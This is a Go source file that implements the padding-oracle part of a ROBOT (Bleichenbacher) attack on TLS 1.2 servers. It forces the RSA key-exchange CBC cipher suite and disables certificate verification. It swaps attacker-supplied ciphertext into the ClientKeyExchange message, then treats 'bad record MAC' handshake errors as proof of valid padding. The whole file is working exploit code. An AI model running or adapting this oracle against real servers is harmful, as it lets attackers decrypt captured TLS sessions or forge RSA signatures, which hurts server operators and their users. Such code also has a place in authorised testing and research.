package core

import (
	"crypto/tls"
	"net"
	"strings"
	"sync/atomic"
	"time"
)

// Server ROBOT oracle communicator
type Oracle struct {
	TargetURL string
	Timeout   time.Duration
}

// Initialize oracle with timeout
func NewOracle(targetURL string, timeoutMS int) *Oracle {
	return &Oracle{
		TargetURL: targetURL,
		Timeout:   time.Duration(timeoutMS) * time.Millisecond,
	}
}

var TotalQueries int64

// Query server padding validity
func (oracle *Oracle) Query(ciphertext []byte) bool {
	atomic.AddInt64(&TotalQueries, 1)
	networkDialer := &net.Dialer{Timeout: oracle.Timeout}
	rawConn, err := networkDialer.Dial("tcp", oracle.TargetURL)
	if err != nil {
		return false
	}
	defer rawConn.Close()

	interceptor := &OracleInterceptor{
		Conn:       rawConn,
		Ciphertext: ciphertext,
	}

	tlsSettings := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS12,
		CipherSuites:       []uint16{tls.TLS_RSA_WITH_AES_128_CBC_SHA},
	}

	secureClient := tls.Client(interceptor, tlsSettings)
	secureClient.SetDeadline(time.Now().Add(oracle.Timeout))

	err = secureClient.Handshake()
	
	// LOGIC FIX:
	// If err is nil, it's obviously true (unlikely during attack).
	if err == nil { return true }

	// If the error contains "bad record MAC", it means the server successfully 
	// decrypted the RSA block and was happy with the padding! 
	// It only failed later because our finished MAC was wrong.
	if strings.Contains(err.Error(), "bad record MAC") || strings.Contains(err.Error(), "local error") {
		return true
	}

	// If the server reset or closed the connection immediately (panic), it's false.
	return false
}

type OracleInterceptor struct {
	net.Conn
	Ciphertext []byte
	swapped    bool
}

func (o *OracleInterceptor) Write(b []byte) (n int, err error) {
	if !o.swapped && len(b) > 11 && b[0] == 0x16 && b[5] == 0x10 {
		// Replace the encrypted PMS in the ClientKeyExchange
		copy(b[11:], o.Ciphertext)
		o.swapped = true
	}
	return o.Conn.Write(b)
}
